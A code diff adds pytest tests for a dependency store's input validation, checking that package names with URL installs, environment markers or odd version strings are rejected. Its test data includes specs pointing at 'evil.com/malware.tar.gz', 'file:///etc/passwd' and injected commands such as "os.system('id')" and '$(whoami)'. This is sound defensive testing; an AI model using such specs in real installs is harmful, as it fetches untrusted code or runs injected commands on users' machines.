@@ -741,6 +741,67 @@ class TestDepsStoreNegativeCases:
             with pytest.raises(ValueError, match="[Ii]nvalid"):
                 store.add(name)
 
+    def test_add_with_url_syntax_rejected(self, tmp_path: Path) -> None:
+        """add() rejects packages with @ (URL install syntax).
+
+        Breaks when: URL-based package installs are allowed, enabling
+        installation from arbitrary git repos or file paths.
+        """
+        from py_code_mode.deps import FileDepsStore
+
+        store = FileDepsStore(tmp_path)
+
+        url_packages = [
+            "package @ https://evil.com/malware.tar.gz",
+            "mypackage @ git+https://github.com/evil/repo",
+            "pkg @ file:///etc/passwd",
+            "pandas>=2.0 @ https://example.com/package.whl",
+        ]
+
+        for name in url_packages:
+            with pytest.raises(ValueError, match="[Ii]nvalid|blocked"):
+                store.add(name)
+
+    def test_add_with_environment_markers_rejected(self, tmp_path: Path) -> None:
+        """add() rejects packages with ; (environment marker syntax).
+
+        Breaks when: Environment markers are allowed, which could
+        potentially be used to inject arbitrary expressions.
+        """
+        from py_code_mode.deps import FileDepsStore
+
+        store = FileDepsStore(tmp_path)
+
+        marker_packages = [
+            "pandas>=2.0; python_version >= '3.8'",
+            "numpy; sys_platform == 'linux'",
+            "requests; extra == 'security'",
+        ]
+
+        for name in marker_packages:
+            with pytest.raises(ValueError, match="[Ii]nvalid|blocked"):
+                store.add(name)
+
+    def test_add_with_permissive_version_specifier_rejected(self, tmp_path: Path) -> None:
+        """add() rejects version specifiers with dangerous characters.
+
+        Breaks when: Version specifier regex is too permissive and allows
+        arbitrary content after version operators.
+        """
+        from py_code_mode.deps import FileDepsStore
+
+        store = FileDepsStore(tmp_path)
+
+        dangerous_versions = [
+            "pandas>=2.0; os.system('id')",
+            "numpy>=1.0 @ https://evil.com/",
+            "requests>=2.0$(whoami)",
+        ]
+
+        for name in dangerous_versions:
+            with pytest.raises(ValueError, match="[Ii]nvalid|blocked"):
+                store.add(name)
+
     def test_file_store_handles_permission_error(self, tmp_path: Path) -> None:
         """FileDepsStore handles filesystem permission errors gracefully.
 
